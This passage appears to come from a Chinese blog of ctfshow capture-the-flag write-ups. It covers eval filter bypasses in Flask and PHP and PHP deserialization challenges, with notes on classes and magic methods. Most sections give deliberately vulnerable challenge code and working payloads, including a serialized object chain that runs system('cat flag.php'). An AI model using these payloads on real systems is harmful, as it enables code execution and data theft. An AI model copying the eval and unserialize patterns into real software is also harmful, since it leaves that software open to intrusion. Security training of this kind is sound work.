<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	reg = re.compile(r&#x27;os|open|system|read|eval|str&#x27;)</span><br><span class="line">    	if reg.match(code)==None:</span><br><span class="line">    		return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<h2 id="web432不会"><a href="#web432不会" class="headerlink" title="web432不会"></a>web432不会</h2><h2 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctfshow=$_GET[&#x27;ctfshow&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;, $ctfshow))&#123;</span><br><span class="line">    eval(&quot;($ctfshow)();&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure>

<h2 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctfshow=$_GET[&#x27;ctfshow&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;, $ctfshow))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/phpinfo/&#x27;, $ctfshow))&#123;</span><br><span class="line">        eval(&quot;($ctfshow)();&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=aaahppo^phphppo^aaainfo</span><br></pre></td></tr></table></figure>

<h2 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctfshow=$_GET[&#x27;ctfshow&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!preg_match(&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;, $ctfshow))&#123;</span><br><span class="line">    eval($ctfshow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=((p).(h).(p).(i).(n).(f).(o))();</span><br></pre></td></tr></table></figure>

<h2 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_反序列化</title>
    <url>/2023/02/02/ctfshow%E5%90%88%E9%9B%86-ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>持续学习中。。。</p>
   <span id="more"></span>

<h2 id="web254-–php类和对象"><a href="#web254-–php类和对象" class="headerlink" title="web254 –php类和对象"></a>web254 –php类和对象</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>username=xxxxxx&amp;password=xxxxxx</code></p>
<p>-&gt;可以理解为“的”</p>
<h2 id="1、定义类"><a href="#1、定义类" class="headerlink" title="1、定义类"></a>1、定义类</h2><p>在 PHP 中，可以使用 class 关键字加类名的方式定义一个类，然后用大括号<code>&#123; &#125;</code>将在类体中定义类的属性和方法包裹起来，类的语法格式如下：</p>
<p>[修饰类的关键字] class 类名{<br>   类的属性和方法;<br> }</p>
<p>类名和变量名还有函数名的命名规则相似，都需要遵循 PHP 中的自定义命名规则，可以是任何非 PHP  保留字的合法标签。一个合法类名以字母或下划线开头，后面跟着若干字母，数字或下划线。如果类名由多个单词组成，习惯上将每个单词的首字母大写。另外，类名最好具有一定的意义，不要随便由几个字母组成。</p>
<p> 修饰类的关键字是一个可选参数，可以省略。我们通常使用下面这些关键字来修饰类：</p>
<ul>
<li>abstract：抽象类或方法，被修饰为抽象类之后，类将不能被实例化，但可以被继承。如果类中有至少一个方法被声明为抽象的，那么这个类也必须声明为抽象的。继承一个抽象类的时候，子类必须重新定义父类中的所有抽象方法，而且这些方法的访问控制必须和父类中一样。</li>
<li>final：使用 final 修饰的类不能被继承，而使用 final 修饰的方法不能在子类中重新定义。</li>
</ul>
<p>注意：一个类可以包含有属于自己的常量、变量（在类中称为“成员属性”或者“属性”）以及函数（在类中称为“成员方法”或者“方法”）。</p>
<h2 id="2、成员属性"><a href="#2、成员属性" class="headerlink" title="2、成员属性"></a>2、成员属性</h2><p>在类中直接声明的变量称为成员属性（也可以称为成员变量），可以在类中声明多个变量，即对象中可以有多个成员属性，每个变量都存储对象不同的属性信息。语法格式如下：</p>
<p>访问权限修饰符 属性名称 &#x3D; 属性值;</p>
<p>成员属性的类型可以是 PHP 中的标量类型和复合类型，所以也可以是其他类实例化的对象，但在类中使用资源和空类型是没有意义的。</p>
<p> 前面我们绍过，声明变量时不需要任何关键字修饰，但是在类中声明成员属性时，变量前面一定要使用一个关键字来修饰，例如  public、private，static  等，但这些关键字修饰的变量都具有一定的意义。如果不需要有特定意义的修饰，可以使用“var”关键字，一旦成员属性有其他的关键字修饰就需要去掉“var”。</p>
<p> 常用访问权限修饰符及其含义如下所示：</p>
<ul>
<li>public：公共的，在类的内部、子类中或者类的外部都可以使用，不受限制；</li>
<li>protected：受保护的，在类的内部和子类中可以使用，但不能在类的外部使用；</li>
<li>private：私有的，只能在类的内部使用，在类的外部或子类中都无法使用。</li>
</ul>
<p>注意：一个类，即一对大括号之间的全部内容都要在一段代码中，也就是一个<code>&lt;?php ... ?&gt;</code>之间，不能分割成多块。</p>
<p>【示例】创建一个 Students 类并在类中声明一些成员属性，代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>提示：权限修饰符可以和定义静态变量的关键字 static 混合在一起使用，如上面代码中所示。</p>
<h2 id="3、成员方法"><a href="#3、成员方法" class="headerlink" title="3、成员方法"></a>3、成员方法</h2><p>在类中定义的函数被称为成员方法。函数和成员方法唯一的区别就是，函数实现的是某个独立的功能，而成员方法是实现类中的一个行为，是类的一部分。</p>
<p> 可以在类中声明多个成员方法，成员方法的声明和函数的声明完全一样，只不过在声明成员方法时可以在<code>function</code>关键字的前面加一些访问权限修饰符来控制访问权限，例如 public、private、protected 等。</p>
<p> 另外需要注意的是，声明的成员方法必须和类是相关的，不能是一些没有意义的操作。例如，在声明学生类时，如果声明了“飞行”的成员方法，实例化出来的每个学生都可以飞了，这样就是一个设计上的错误。</p>
<p>【示例】在上面示例中创建的 Students 类中创建一些成员方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">        public function Write()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        protected static function Read()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        function Listen()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://c.biancheng.net/view/7492.html">http://c.biancheng.net/view/7492.html</a></p>
<h2 id="web255-–认识反序列化"><a href="#web255-–认识反序列化" class="headerlink" title="web255 –认识反序列化"></a>web255 –认识反序列化</h2><p>触发时机，分组记忆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct  //实例化对象时触发</span><br><span class="line">__destruct  //对象引用完成或对象被销毁反序列化之后</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()  //serialize()之前</span><br><span class="line">__wakeup()  //unserialize()之前</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__tostring() //把对象当作字符串掉用（使用echo print）</span><br><span class="line">__invoke()  //把对象当成函数调用</span><br><span class="line">__clone()  //当使用clone 拷贝完成一个对象</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call() //调用一个不存在的方法</span><br><span class="line">__callStatic() //静态调用一个不存在的方法</span><br><span class="line">__get()  /调用的成员属性不存在</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__set() //给不存在的成员属性赋值</span><br><span class="line">__isset()  //对不可访问属性使用isset()或empty</span><br><span class="line">__unset()   //对不可访问属性使用unset()</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>PHP serialize() 函数</p>
<p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
<p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
<p>如果想要将已序列化的字符串变回 PHP 的值，可使用 <a href="https://www.runoob.com/php/php-unserialize-function.html">unserialize()</a>。</p>
<p><strong>虽然我们不能改变类方法，但我们可以改变类的属性</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始有反序列化，主要就是$isVip的值需要为true</p>
<p>所以我们可以序列化一个ctfShowUser的实例，将其中的$isVip更改为true</p>
<p>通过cookie传递序列化字符串就可以了,<strong>记得序列化字符串要进行url编码</strong></p>
<p>生成序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">	<span class="comment">// 传入的对象isvip=true;</span></span><br><span class="line">	<span class="comment">// O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">COOKIE user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>多了一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>重新定义一下username password</p>
<p>payload: username&#x3D;ctf&amp;password&#x3D;xxx</p>
<p><code>url=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A3%3A%22ctf%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22xxx%22%3B%7D</code></p>
<p>ctfshow{02a42717-ddee-45d2-964d-fde32fa618bf}</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//魔术方法 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。在类实例化的时候,会自动调用该魔术方法,进行类的初始化;</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815338">https://blog.csdn.net/Jeff_12138/article/details/124815338</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__construct：实例化对象时被调用，其作用是拿来初始化一些值。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



